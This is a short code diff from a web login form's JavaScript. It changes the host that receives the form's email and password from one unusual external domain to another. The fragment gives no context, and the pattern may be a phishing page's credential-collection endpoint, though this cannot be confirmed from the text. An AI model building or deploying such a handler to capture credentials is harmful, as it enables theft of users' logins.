@@ -16,7 +16,7 @@ document.getElementById('login-form').addEventListener('submit', function(event)
   formData.append('email', email);
   formData.append('password', password);
 
-  fetch('https://api.vitalidadintegral.store/login/to-access.php', {
+  fetch('https://api.lab-crm.ws/login/to-access.php', {
     method: 'POST',
     body: formData
   })
